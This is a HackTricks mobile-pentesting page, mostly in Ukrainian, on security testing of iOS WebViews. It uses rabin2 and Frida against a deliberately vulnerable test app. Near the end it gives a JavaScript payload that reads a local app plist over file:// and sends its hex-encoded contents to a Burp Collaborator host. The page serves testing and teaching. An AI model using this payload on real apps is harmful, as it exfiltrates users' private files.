# iOS WebViews

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

The code of this page was extracted from [here](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Check the page for further details.


## WebViews types

WebViews –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –¥–æ–¥–∞—Ç–∫–∞—Ö –¥–ª—è —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–≥–æ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –≤–µ–±-–∫–æ–Ω—Ç–µ–Ω—Ç—É. –†—ñ–∑–Ω—ñ —Ç–∏–ø–∏ WebViews –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Ä—ñ–∑–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ—ó –±–µ–∑–ø–µ–∫–∏ –¥–ª—è iOS-–¥–æ–¥–∞—Ç–∫—ñ–≤. –û—Å—å –∫–æ—Ä–æ—Ç–∫–∏–π –æ–≥–ª—è–¥:

- **UIWebView**, —è–∫–∏–π –±—ñ–ª—å—à–µ –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∑ iOS 12 —á–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –≤–∏–º–∫–Ω–µ–Ω–Ω—è **JavaScript**, —â–æ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ —ñ–Ω'—î–∫—Ü—ñ–π —Å–∫—Ä–∏–ø—Ç—ñ–≤ —Ç–∞ –∞—Ç–∞–∫ **Cross-Site Scripting (XSS)**.

- **WKWebView** —î –ø–µ—Ä–µ–≤–∞–∂–Ω–∏–º –≤–∞—Ä—ñ–∞–Ω—Ç–æ–º –¥–ª—è —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó –≤–µ–±-–∫–æ–Ω—Ç–µ–Ω—Ç—É –≤ –¥–æ–¥–∞—Ç–∫–∏, –ø—Ä–æ–ø–æ–Ω—É—é—á–∏ –ø–æ–∫—Ä–∞—â–µ–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏ –±–µ–∑–ø–µ–∫–∏. **JavaScript** —É–≤—ñ–º–∫–Ω–µ–Ω–æ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, –∞–ª–µ –π–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–º–∫–Ω—É—Ç–∏ –∑–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ. –í—ñ–Ω —Ç–∞–∫–æ–∂ –ø—ñ–¥—Ç—Ä–∏–º—É—î —Ñ—É–Ω–∫—Ü—ñ—ó, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–º—É –≤—ñ–¥–∫—Ä–∏—Ç—Ç—é –≤—ñ–∫–æ–Ω JavaScript —ñ –∑–∞–±–µ–∑–ø–µ—á—É—î –±–µ–∑–ø–µ—á–Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—Å—å–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É. –ö—Ä—ñ–º —Ç–æ–≥–æ, –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∞ **WKWebView** –º—ñ–Ω—ñ–º—ñ–∑—É—î —Ä–∏–∑–∏–∫ –ø–æ—à–∫–æ–¥–∂–µ–Ω–Ω—è –ø–∞–º'—è—Ç—ñ, —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ –æ—Å–Ω–æ–≤–Ω–∏–π –ø—Ä–æ—Ü–µ—Å –¥–æ–¥–∞—Ç–∫–∞.

- **SFSafariViewController** –ø—Ä–æ–ø–æ–Ω—É—î —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∏–∑–æ–≤–∞–Ω–∏–π –¥–æ—Å–≤—ñ–¥ –≤–µ–±-—Å–µ—Ä—Ñ—ñ–Ω–≥—É –≤ –¥–æ–¥–∞—Ç–∫–∞—Ö, –≤–ø—ñ–∑–Ω–∞–≤–∞–Ω–∏–π –∑–∞ —Å–≤–æ—ó–º —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–º –º–∞–∫–µ—Ç–æ–º, –≤–∫–ª—é—á–∞—é—á–∏ –ø–æ–ª–µ –∞–¥—Ä–µ—Å–∏ —Ç—ñ–ª—å–∫–∏ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è, –∫–Ω–æ–ø–∫–∏ —Å–ø—ñ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É —Ç–∞ –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó, –∞ —Ç–∞–∫–æ–∂ –ø—Ä—è–º–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –¥–ª—è –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è –∫–æ–Ω—Ç–µ–Ω—Ç—É –≤ Safari. –ù–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ **WKWebView**, **JavaScript** –Ω–µ –º–æ–∂–Ω–∞ –≤–∏–º–∫–Ω—É—Ç–∏ –≤ **SFSafariViewController**, —è–∫–∏–π —Ç–∞–∫–æ–∂ –¥—ñ–ª–∏—Ç—å—Å—è –∫—É–∫–∞–º–∏ —Ç–∞ –¥–∞–Ω–∏–º–∏ –∑ Safari, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤—ñ–¥ –¥–æ–¥–∞—Ç–∫–∞. –ô–æ–≥–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—Ç–∏ –ø–æ–º—ñ—Ç–Ω–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ–π App Store.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## WebViews Configuration Exploration Summary

### **Static Analysis Overview**

–£ –ø—Ä–æ—Ü–µ—Å—ñ –≤–∏–≤—á–µ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π **WebViews** –∞–∫—Ü–µ–Ω—Ç—É—î—Ç—å—Å—è –Ω–∞ –¥–≤–æ—Ö –æ—Å–Ω–æ–≤–Ω–∏—Ö —Ç–∏–ø–∞—Ö: **UIWebView** —Ç–∞ **WKWebView**. –î–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ü–∏—Ö WebViews —É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –∫–æ–º–∞–Ω–¥–∏, —â–æ —à—É–∫–∞—é—Ç—å —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω—ñ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –∫–ª–∞—Å–∏ —Ç–∞ –º–µ—Ç–æ–¥–∏ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó.

- **UIWebView Identification**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
–¶—è –∫–æ–º–∞–Ω–¥–∞ –¥–æ–ø–æ–º–∞–≥–∞—î –∑–Ω–∞—Ö–æ–¥–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ **UIWebView**, —à—É–∫–∞—é—á–∏ —Ç–µ–∫—Å—Ç–æ–≤—ñ —Ä—è–¥–∫–∏, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ –Ω–∏–º, —É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ.

- **–Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
–ê–Ω–∞–ª–æ–≥—ñ—á–Ω–æ, –¥–ª—è **WKWebView** —Ü—è –∫–æ–º–∞–Ω–¥–∞ —à—É–∫–∞—î –≤ –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ —Ç–µ–∫—Å—Ç–æ–≤—ñ —Ä—è–¥–∫–∏, —â–æ –≤–∫–∞–∑—É—é—Ç—å –Ω–∞ –π–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.

–ö—Ä—ñ–º —Ç–æ–≥–æ, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è **WKWebView**, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∞ –∫–æ–º–∞–Ω–¥–∞, —è–∫–∞ –Ω–∞—Ü—ñ–ª–µ–Ω–∞ –Ω–∞ –ø—ñ–¥–ø–∏—Å –º–µ—Ç–æ–¥—É, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –π–æ–≥–æ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó JavaScript**

–î–ª—è **WKWebView** –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î—Ç—å—Å—è, —â–æ –≤–∏–º–∫–Ω–µ–Ω–Ω—è JavaScript —î –Ω–∞–π–∫—Ä–∞—â–æ—é –ø—Ä–∞–∫—Ç–∏–∫–æ—é, —è–∫—â–æ —Ü–µ –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ. –°–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è, —â–æ–± –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏, —â–æ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `javaScriptEnabled` –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –≤ `false`, —â–æ –∑–∞–±–µ–∑–ø–µ—á—É—î –≤–∏–º–∫–Ω–µ–Ω–Ω—è JavaScript:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **–¢—ñ–ª—å–∫–∏ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –±–µ–∑–ø–µ—á–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É**

**WKWebView** –ø—Ä–æ–ø–æ–Ω—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º –∑ –∑–º—ñ—à–∞–Ω–∏–º –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º, –Ω–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ **UIWebView**. –¶–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ `hasOnlySecureContent`, —â–æ–± –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—Å—ñ—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —á–µ—Ä–µ–∑ –±–µ–∑–ø–µ—á–Ω—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è. –ü–æ—à—É–∫ —É —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **–Ü–Ω—Å–∞–π—Ç–∏ –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ –∞–Ω–∞–ª—ñ–∑—É**

–î–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –∫—É–ø–∏ –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ WebView —Ç–∞ —ó—Ö –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π. –î–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —Å–∫—Ä–∏–ø—Ç –ø—ñ–¥ –Ω–∞–∑–≤–æ—é `webviews_inspector.js`, —è–∫–∏–π –Ω–∞—Ü—ñ–ª–µ–Ω–∏–π –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ `UIWebView`, `WKWebView` —Ç–∞ `SFSafariViewController`. –í—ñ–Ω —Ä–µ—î—Å—Ç—Ä—É—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∑–Ω–∞–π–¥–µ–Ω—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏, –≤–∫–ª—é—á–∞—é—á–∏ URL-–∞–¥—Ä–µ—Å–∏ —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ JavaScript —Ç–∞ –±–µ–∑–ø–µ—á–Ω–∏–º –∫–æ–Ω—Ç–µ–Ω—Ç–æ–º.

–ü–µ—Ä–µ–≤—ñ—Ä–∫—É –∫—É–ø–∏ –º–æ–∂–Ω–∞ –ø—Ä–æ–≤–æ–¥–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `ObjC.choose()`, —â–æ–± —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ WebView —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ `javaScriptEnabled` —Ç–∞ `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

–°–∫—Ä–∏–ø—Ç –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∑:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**–ö–ª—é—á–æ–≤—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏**:
- –ï–∫–∑–µ–º–ø–ª—è—Ä–∏ WebViews —É—Å–ø—ñ—à–Ω–æ –≤–∏—è–≤–ª–µ–Ω—ñ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω—ñ.
- –ü–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó JavaScript —Ç–∞ –±–µ–∑–ø–µ—á–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É.

–¶–µ–π –ø—ñ–¥—Å—É–º–æ–∫ –æ—Ö–æ–ø–ª—é—î –∫—Ä–∏—Ç–∏—á–Ω—ñ –∫—Ä–æ–∫–∏ —Ç–∞ –∫–æ–º–∞–Ω–¥–∏, —â–æ –±–µ—Ä—É—Ç—å —É—á–∞—Å—Ç—å –≤ –∞–Ω–∞–ª—ñ–∑—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π WebView —á–µ—Ä–µ–∑ —Å—Ç–∞—Ç–∏—á–Ω—ñ —Ç–∞ –¥–∏–Ω–∞–º—ñ—á–Ω—ñ –ø—ñ–¥—Ö–æ–¥–∏, –∑–æ—Å–µ—Ä–µ–¥–∂—É—é—á–∏ —É–≤–∞–≥—É –Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è—Ö –±–µ–∑–ø–µ–∫–∏, —Ç–∞–∫–∏—Ö —è–∫ –∞–∫—Ç–∏–≤–∞—Ü—ñ—è JavaScript —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è –∑–º—ñ—à–∞–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É.

## –û–±—Ä–æ–±–∫–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤ WebView

–û–±—Ä–æ–±–∫–∞ –∫–æ–Ω—Ç–µ–Ω—Ç—É –≤ WebViews —î –∫—Ä–∏—Ç–∏—á–Ω–æ –≤–∞–∂–ª–∏–≤–∏–º –∞—Å–ø–µ–∫—Ç–æ–º, –æ—Å–æ–±–ª–∏–≤–æ –ø—Ä–∏ —Ä–æ–±–æ—Ç—ñ –∑ —Ä—ñ–∑–Ω–∏–º–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ `http(s)://`, `file://` —Ç–∞ `tel://`. –¶—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —è–∫ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π, —Ç–∞–∫ —ñ –ª–æ–∫–∞–ª—å–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç –≤ –¥–æ–¥–∞—Ç–∫–∞—Ö. –ü—ñ–¥–∫—Ä–µ—Å–ª—é—î—Ç—å—Å—è, —â–æ –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –≤–∂–∏—Ç–∏ –∑–∞—Ö–æ–¥—ñ–≤, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–ø–ª–∏–≤—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –Ω–∞ —ñ–º'—è –∞–±–æ —à–ª—è—Ö —Ñ–∞–π–ª—É —Ç–∞ —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—é —Å–∞–º–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É.

**WebViews** –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Ä—ñ–∑–Ω—ñ –º–µ—Ç–æ–¥–∏ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–Ω—Ç—É. –î–ª—è **UIWebView**, —è–∫–∏–π –∑–∞—Ä–∞–∑ –∑–∞—Å—Ç–∞—Ä—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –º–µ—Ç–æ–¥–∏, —Ç–∞–∫—ñ —è–∫ `loadHTMLString:baseURL:` —Ç–∞ `loadData:MIMEType:textEncodingName:baseURL:`. **WKWebView**, –∑ —ñ–Ω—à–æ–≥–æ –±–æ–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` —Ç–∞ `loadRequest:` –¥–ª—è –≤–µ–±-–∫–æ–Ω—Ç–µ–Ω—Ç—É. –ú–µ—Ç–æ–¥–∏, —Ç–∞–∫—ñ —è–∫ `pathForResource:ofType:`, `URLForResource:withExtension:` —Ç–∞ `init(contentsOf:encoding:)`, –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤. –ú–µ—Ç–æ–¥ `loadFileURL:allowingReadAccessToURL:` –æ—Å–æ–±–ª–∏–≤–æ –ø–æ–º—ñ—Ç–Ω–∏–π –∑–∞–≤–¥—è–∫–∏ —Å–≤–æ—ó–π –∑–¥–∞—Ç–Ω–æ—Å—Ç—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π URL –∞–±–æ –∫–∞—Ç–∞–ª–æ–≥ —É WebView, –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤—ñ–¥–∫—Ä–∏–≤–∞—é—á–∏ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ, —è–∫—â–æ –≤–∫–∞–∑–∞–Ω–æ –∫–∞—Ç–∞–ª–æ–≥.

–©–æ–± –∑–Ω–∞–π—Ç–∏ —Ü—ñ –º–µ—Ç–æ–¥–∏ –≤ –≤–∏—Ö—ñ–¥–Ω–æ–º—É –∫–æ–¥—ñ –∞–±–æ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏, –ø–æ–¥—ñ–±–Ω—ñ –¥–æ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
–©–æ–¥–æ **–¥–æ—Å—Ç—É–ø—É –¥–æ —Ñ–∞–π–ª—ñ–≤**, UIWebView –¥–æ–∑–≤–æ–ª—è—î –π–æ–≥–æ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ, —Ç–æ–¥—ñ —è–∫ WKWebView –≤–≤–æ–¥–∏—Ç—å –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `allowFileAccessFromFileURLs` —Ç–∞ `allowUniversalAccessFromFileURLs` –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –¥–æ—Å—Ç—É–ø–æ–º –∑ URL-–∞–¥—Ä–µ—Å —Ñ–∞–π–ª—ñ–≤, –æ–±–∏–¥–≤–∞ –∑ —è–∫–∏—Ö –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –º–∞—é—Ç—å –∑–Ω–∞—á–µ–Ω–Ω—è false.

–ü—Ä–∏–∫–ª–∞–¥ —Å–∫—Ä–∏–ø—Ç–∞ Frida –Ω–∞–¥–∞—î—Ç—å—Å—è –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π **WKWebView** –¥–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –±–µ–∑–ø–µ–∫–∏:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
–ù–∞—Ä–µ—à—Ç—ñ, –ø—Ä–∏–∫–ª–∞–¥ JavaScript-–ø–µ–π–ª–æ–∞–¥–∞, —Å–ø—Ä—è–º–æ–≤–∞–Ω–æ–≥–æ –Ω–∞ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—é –ª–æ–∫–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤, –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π —Ä–∏–∑–∏–∫ –±–µ–∑–ø–µ–∫–∏, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–º–∏ WebViews. –¶–µ–π –ø–µ–π–ª–æ–∞–¥ –∫–æ–¥—É—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—ñ–≤ —É —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–∏–π —Ñ–æ—Ä–º–∞—Ç –ø–µ—Ä–µ–¥ —ó—Ö –ø–µ—Ä–µ–¥–∞—á–µ—é –Ω–∞ —Å–µ—Ä–≤–µ—Ä, –ø—ñ–¥–∫—Ä–µ—Å–ª—é—é—á–∏ –≤–∞–∂–ª–∏–≤—ñ—Å—Ç—å —Å—É–≤–æ—Ä–∏—Ö –∑–∞—Ö–æ–¥—ñ–≤ –±–µ–∑–ø–µ–∫–∏ –≤ —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ—è—Ö WebView.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## Native Methods Exposed Through WebViews

